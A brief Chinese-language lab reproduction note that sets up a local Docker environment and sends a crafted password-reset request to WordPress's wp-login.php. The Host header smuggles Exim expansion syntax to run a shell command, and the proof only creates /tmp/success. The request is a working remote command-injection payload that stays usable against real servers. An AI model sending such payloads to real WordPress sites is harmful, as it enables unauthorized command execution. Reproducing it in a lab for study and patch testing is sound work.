开启环境：
```
docker compose up -d
```
访问页面：
```
http://localhost:18080
```

发送数据包：
```
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: 127.0.0.1(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)
Content-Type: application/x-www-form-urlencoded

wp-submit=Get+New+Password&redirect_to=&user_login=admin
```
进入容器内查看/tmp就可以看到success被创建


